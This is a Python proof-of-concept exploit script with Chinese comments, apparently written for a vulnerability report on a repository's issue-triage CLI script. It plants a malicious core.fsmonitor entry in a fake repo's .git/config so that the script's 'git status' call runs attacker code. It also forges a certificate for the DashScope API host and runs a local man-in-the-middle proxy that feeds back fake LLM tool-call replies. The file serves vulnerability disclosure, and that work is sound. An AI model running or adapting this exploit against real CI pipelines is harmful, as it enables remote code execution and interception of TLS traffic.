# -*- coding: utf-8 -*-
"""AS-2026-005 _assert_pristine → subprocess.run（scripts/issue_triage.py）
— 真实 CLI 利用链 exp

真实目标：未经改动的 scripts/issue_triage.py（上游仓库自带的维护脚本，
真实部署形态即 CI 中以 CLI 调用）：
    python scripts/issue_triage.py --number 1 --author x \
        --title-file t.txt --body-file b.txt --model qwen-plus \
        --workdir <attacker-repo> --out out.json

攻击模型：--workdir 指向攻击者可控的仓库 checkout（供应链 / 恶意 PR
场景），.git/config 的 core.fsmonitor 在 _assert_pristine 的
`git status --porcelain`（scripts/issue_triage.py:306）触发命令执行。

LLM 依赖：脚本的 DashScope 模型（openai SDK, base_url=官方常量）经
HTTPS_PROXY + SSL_CERT_FILE（Python ssl 默认信任路径，均为环境变量级
测试夹具，不改任何代码）路由到本地 MITM stub，stub 返回
GenerateStructuredOutput 工具调用使两个 LLM 阶段（classify / verify）
通过 —— 真实脚本完整走到 _assert_pristine。
"""
import json
import os
import socket
import socketserver
import ssl
import stat
import subprocess
import sys
import threading
import time

HERE = os.path.dirname(os.path.abspath(__file__))
SCRIPTS = r"C:\Users\User\Desktop\aifuzz\agent\agentscope-2.0.11\agentscope-2.0.11\scripts\issue_triage.py"
PY = sys.executable
PROXY_PORT = 18851
TMP = os.path.join(os.environ.get("TEMP", "/tmp"), "as_realapi_triage")
WORKDIR = os.path.join(TMP, "evil-repo")
MARKER = os.path.join(TMP, "RCE_MARKER.txt")
CA_PEM = os.path.join(TMP, "ca.pem")
LEAF_PEM = os.path.join(TMP, "leaf.pem")
LEAF_KEY = os.path.join(TMP, "leaf.key")

# ---------------------------------------------------------------------------
# 自签 CA + dashscope.aliyuncs.com 叶子证书（cryptography，环境夹具）
# ---------------------------------------------------------------------------
def gen_certs():
    from cryptography import x509
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.x509.oid import NameOID
    import datetime as dt

    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    subject = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "lab-CA")])
    ca = (
        x509.CertificateBuilder()
        .subject_name(subject).issuer_name(subject)
        .public_key(key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(dt.datetime.utcnow() - dt.timedelta(days=1))
        .not_valid_after(dt.datetime.utcnow() + dt.timedelta(days=30))
        .add_extension(x509.BasicConstraints(ca=True, path_length=1), True)
        .sign(key, hashes.SHA256())
    )
    lkey = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    leaf = (
        x509.CertificateBuilder()
        .subject_name(x509.Name([
            x509.NameAttribute(NameOID.COMMON_NAME, "dashscope.aliyuncs.com"),
        ]))
        .issuer_name(subject)
        .public_key(lkey.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(dt.datetime.utcnow() - dt.timedelta(days=1))
        .not_valid_after(dt.datetime.utcnow() + dt.timedelta(days=30))
        .add_extension(x509.SubjectAlternativeName([
            x509.DNSName("dashscope.aliyuncs.com"),
        ]), False)
        .sign(key, hashes.SHA256())
    )
    with open(CA_PEM, "wb") as f:
        f.write(ca.public_bytes(serialization.Encoding.PEM))
    with open(LEAF_PEM, "wb") as f:
        f.write(leaf.public_bytes(serialization.Encoding.PEM))
    with open(LEAF_KEY, "wb") as f:
        f.write(lkey.private_bytes(
            serialization.Encoding.PEM,
            serialization.PrivateFormat.TraditionalOpenSSL,
            serialization.NoEncryption(),
        ))


# ---------------------------------------------------------------------------
# MITM HTTPS stub —— OpenAI 兼容流式响应 + GenerateStructuredOutput
# ---------------------------------------------------------------------------
def sse_tool_call(args_json):
    chunks = [
        {
            "id": "c1", "object": "chat.completion.chunk", "created": 0,
            "model": "qwen-plus",
            "choices": [{"index": 0, "delta": {
                "role": "assistant",
                "tool_calls": [{"index": 0, "id": "call_1", "type": "function",
                                "function": {"name": "GenerateStructuredOutput",
                                             "arguments": ""}}],
            }, "finish_reason": None}],
        },
        {
            "id": "c1", "object": "chat.completion.chunk", "created": 0,
            "model": "qwen-plus",
            "choices": [{"index": 0, "delta": {
                "tool_calls": [{"index": 0,
                                "function": {"arguments": args_json}}],
            }, "finish_reason": None}],
        },
        {
            "id": "c1", "object": "chat.completion.chunk", "created": 0,
            "model": "qwen-plus",
            "choices": [{"index": 0, "delta": {},
                         "finish_reason": "tool_calls"}],
            "usage": {"prompt_tokens": 1, "completion_tokens": 1,
                      "total_tokens": 2},
        },
    ]
    out = b""
    for c in chunks:
        out += b"data: " + json.dumps(c).encode() + b"\n\n"
    out += b"data: [DONE]\n\n"
    return out


def pick_args(body: bytes) -> str:
    # 结构化输出工具 schema 决定阶段：含 "verdict" → BugVerdict
    if b'"verdict"' in body:
        return json.dumps({
            "verdict": "confirmed",
            "evidence": "stub: model reached GenerateStructuredOutput",
            "summary": "stub verdict",
        })
    return json.dumps({
        "is_bug": True,
        "reason": "Reports incorrect behaviour.",
    })


class _Handler(socketserver.BaseRequestHandler):
    def handle(self):
        sock = self.request
        # 1) 读 CONNECT
        buf = b""
        while b"\r\n\r\n" not in buf:
            d = sock.recv(4096)
            if not d:
                return
            buf += d
        sock.sendall(b"HTTP/1.1 200 Connection established\r\n\r\n")

        # 2) TLS 握手（leaf 证书）
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain(LEAF_PEM, LEAF_KEY)
        try:
            tls = ctx.wrap_socket(sock, server_side=True)
        except Exception:
            return

        # 3) 读 HTTP 请求（可能多条，逐条应答）
        try:
            while True:
                head = b""
                while b"\r\n\r\n" not in head:
                    d = tls.recv(8192)
                    if not d:
                        return
                    head += d
                # Content-Length
                cl = 0
                for line in head.split(b"\r\n"):
                    if line.lower().startswith(b"content-length:"):
                        cl = int(line.split(b":", 1)[1].strip())
                body = b""
                head_body = head.split(b"\r\n\r\n", 1)
                if len(head_body) == 2:
                    body = head_body[1]
                while len(body) < cl:
                    body += tls.recv(8192)
                args_json = pick_args(body)
                payload = sse_tool_call(args_json)
                resp = (
                    b"HTTP/1.1 200 OK\r\n"
                    b"Content-Type: text/event-stream\r\n"
                    b"Content-Length: " + str(len(payload)).encode() + b"\r\n"
                    b"Connection: close\r\n\r\n" + payload
                )
                tls.sendall(resp)
                return  # 单请求单连接（Connection: close）
        except Exception:
            return


def start_proxy():
    socketserver.ThreadingTCPServer.allow_reuse_address = True
    srv = socketserver.ThreadingTCPServer(
        ("127.0.0.1", PROXY_PORT), _Handler)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return srv


# ---------------------------------------------------------------------------
# 恶意 workdir + 真实 CLI 执行
# ---------------------------------------------------------------------------
def make_workdir():
    for p in (TMP,):
        os.makedirs(p, exist_ok=True)
    if os.path.exists(WORKDIR):
        for root, dirs, files in os.walk(WORKDIR, topdown=False):
            for f in files:
                try:
                    os.chmod(os.path.join(root, f), stat.S_IWRITE)
                except Exception:
                    pass
                os.remove(os.path.join(root, f))
            for d in dirs:
                os.rmdir(os.path.join(root, d))
        os.rmdir(WORKDIR)
    os.makedirs(os.path.join(WORKDIR, ".git"))
    os.makedirs(os.path.join(WORKDIR, ".venv", "bin"), exist_ok=True)
    # 脚本要求 workdir/.venv/bin/python 存在
    open(os.path.join(WORKDIR, ".venv", "bin", "python"), "w").close()
    # 载荷
    with open(os.path.join(WORKDIR, "payload.py"), "w", encoding="utf-8") as f:
        f.write(
            "import datetime\n"
            "open(r'%s', 'a').write('RCE %%s\\n' %% datetime.datetime.now())\n"
            % MARKER.replace("\\", "\\\\"),
        )
    # 恶意 git 配置
    with open(os.path.join(WORKDIR, ".git", "config"), "w") as f:
        f.write(
            "[core]\n"
            "\trepositoryformatversion = 0\n"
            "\tfilemode = true\n"
            "\tbare = false\n"
            "\tfsmonitor = \"%s\" payload.py\n" % PY.replace("\\", "/"),
        )
    with open(os.path.join(WORKDIR, ".git", "HEAD"), "w") as f:
        f.write("ref: refs/heads/main\n")
    os.makedirs(os.path.join(WORKDIR, ".git", "objects"), exist_ok=True)
    os.makedirs(os.path.join(WORKDIR, ".git", "refs"), exist_ok=True)
    return WORKDIR


def main():
    os.makedirs(TMP, exist_ok=True)
    gen_certs()
    proxy = start_proxy()
    workdir = make_workdir()
    print("[setup] MITM stub on 127.0.0.1:%d" % PROXY_PORT)
    print("[setup] malicious workdir:", workdir)

    title_f = os.path.join(TMP, "t.txt")
    body_f = os.path.join(TMP, "b.txt")
    out_f = os.path.join(TMP, "out.json")
    open(title_f, "w").write("Bug: example")
    open(body_f, "w").write("Something behaves incorrectly.")
    if os.path.exists(MARKER):
        os.remove(MARKER)

    env = dict(os.environ)
    env["DASHSCOPE_API_KEY"] = "sk-dummy"
    env["HTTPS_PROXY"] = "http://127.0.0.1:%d" % PROXY_PORT
    env["HTTP_PROXY"] = "http://127.0.0.1:%d" % PROXY_PORT
    env["SSL_CERT_FILE"] = CA_PEM  # ssl.get_default_verify_paths 信任链

    cmd = [
        PY, SCRIPTS,
        "--number", "1",
        "--author", "attacker",
        "--title-file", title_f,
        "--body-file", body_f,
        "--model", "qwen-plus",
        "--workdir", workdir,
        "--out", out_f,
    ]
    print("[run] python scripts/issue_triage.py --workdir <evil-repo> ...")
    t0 = time.time()
    r = subprocess.run(cmd, env=env, capture_output=True, text=True,
                       timeout=180, cwd=os.path.dirname(SCRIPTS))
    print("[cli] exit =", r.returncode, " (%.1fs)" % (time.time() - t0))
    tail = (r.stdout or "")[-800:]
    if tail:
        print("[cli stdout tail]\n" + tail)
    if r.returncode != 0 and r.stderr:
        print("[cli stderr tail]\n" + (r.stderr or "")[-500:])

    time.sleep(1)
    ok = os.path.exists(MARKER)
    if ok:
        print("[evidence] marker:", open(MARKER).read().strip())
    print()
    print("[VERDICT] RCE_VIA_REAL_CLI_issue_triage =", ok)
    print("[VERDICT] SINK = _assert_pristine git status (scripts/issue_triage.py:306)")
    print("[VERDICT] EXP_SUCCESS =", ok)


if __name__ == "__main__":
    main()
